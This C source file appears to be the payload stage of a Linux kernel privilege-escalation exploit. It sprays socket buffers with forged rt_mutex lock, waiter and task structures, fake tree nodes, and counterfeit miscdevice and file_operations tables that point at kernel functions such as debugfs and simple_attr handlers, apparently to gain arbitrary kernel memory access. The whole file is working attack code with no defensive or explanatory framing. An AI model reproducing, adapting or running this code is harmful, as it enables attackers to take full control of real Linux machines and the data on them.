#include "common.h"

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
void put64(unsigned char *p, size_t off, uint64_t value) { memcpy(p + off, &value, sizeof(value)); }

void put32(unsigned char *p, size_t off, uint32_t value) { memcpy(p + off, &value, sizeof(value)); }

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF, text_addr(DEFAULT_LLSEEK));
  put64(p, off + FOPS_READ_OFF, text_addr(SIMPLE_ATTR_READ));
  put64(p, off + FOPS_WRITE_OFF, text_addr(SIMPLE_ATTR_WRITE));
}

void payload_set_base(uintptr_t payload_base) {
  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  fake_parent = fake_fops;
  fake_right = 0;
  fake_left = 0;
}

int prepare_skb_payload(uintptr_t base) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  /* payload_base = page_base + SKB_DATA_DELTA (negative): the SKB data
   * start; do not change. */
  uintptr_t payload_base = base + SKB_DATA_DELTA;

  payload_set_base(payload_base);

  uintptr_t write_pc = 0;
  uintptr_t write_right = 0;
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    put64(p, LOCK_OFF + 0x08, fake_w0);
    put64(p, LOCK_OFF + 0x10, fake_w0);
    /* LOCK+0x18 = fake_task|1; usage must stay nonzero. */
    put64(p, LOCK_OFF + 0x18, fake_task | 1);

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    memset(p + ATTR_CONTROLLER_OFF, 0, ATTR_OBJECT_SIZE);
    put32(p, ATTR_CONTROLLER_OFF + MISC_STRUCT_MINOR_OFF, UINPUT_MINOR);
    put64(p, ATTR_CONTROLLER_OFF + MISC_STRUCT_NAME_OFF, text_addr(DEBUGFS_U64_SET));
    put64(p, ATTR_CONTROLLER_OFF + MISC_STRUCT_FOPS_OFF, payload_base + ATTR_FOPS_OFF);
    put64(p, ATTR_CONTROLLER_OFF + MISC_STRUCT_LIST_OFF,
          payload_base + ATTR_DATA_OFF + MISC_STRUCT_LIST_OFF);
    put64(p, ATTR_CONTROLLER_OFF + MISC_STRUCT_NODENAME_OFF,
          payload_base + ATTR_CONTROLLER_OFF + MISC_STRUCT_MINOR_OFF);
    put64(p, ATTR_CONTROLLER_OFF + MISC_STRUCT_MODE_OFF, text_addr(DEBUGFS_U64_FORMAT));

    memset(p + ATTR_DATA_OFF, 0, ATTR_OBJECT_SIZE);
    put32(p, ATTR_DATA_OFF + MISC_STRUCT_MINOR_OFF, UINPUT_MINOR);
    put64(p, ATTR_DATA_OFF + MISC_STRUCT_NAME_OFF, text_addr(DEBUGFS_U64_SET));
    put64(p, ATTR_DATA_OFF + MISC_STRUCT_FOPS_OFF, payload_base + ATTR_FOPS_OFF);
    put64(p, ATTR_DATA_OFF + MISC_STRUCT_LIST_OFF, text_addr(UINPUT_MISC) + MISC_STRUCT_LIST_OFF);
    put64(p, ATTR_DATA_OFF + MISC_STRUCT_NODENAME_OFF,
          payload_base + ATTR_CONTROLLER_OFF + ATTR_DATA_PTR_OFF);
    put64(p, ATTR_DATA_OFF + MISC_STRUCT_MODE_OFF, text_addr(DEBUGFS_U64_FORMAT));

    memset(p + ATTR_FOPS_OFF, 0, FOPS_SHOW_FDINFO_OFF + 8);
    put_fake_fops_table(p, ATTR_FOPS_OFF);

    memset(p + ATTR_W1_SCRATCH_OFF, 0, 0x100);

    put_fake_fops_table(p, FOPS_TABLE_OFF);
  }
  return 1;
}
